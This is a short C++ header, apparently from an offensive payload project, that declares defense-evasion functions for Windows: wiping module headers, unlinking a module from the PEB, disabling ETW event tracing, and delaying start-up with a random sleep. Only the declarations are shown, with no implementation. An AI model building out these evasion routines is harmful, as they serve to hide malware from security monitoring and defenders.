// src/payload/evasion.hpp
#pragma once
#include <windows.h>

namespace rex::evasion {

void wipe_headers(HMODULE base);
void unlink_module(HMODULE base);   // PEB unlink
void disable_etw();
void delayed_init(void (*fn)());    // call after random short sleep

} // namespace rex::evasion
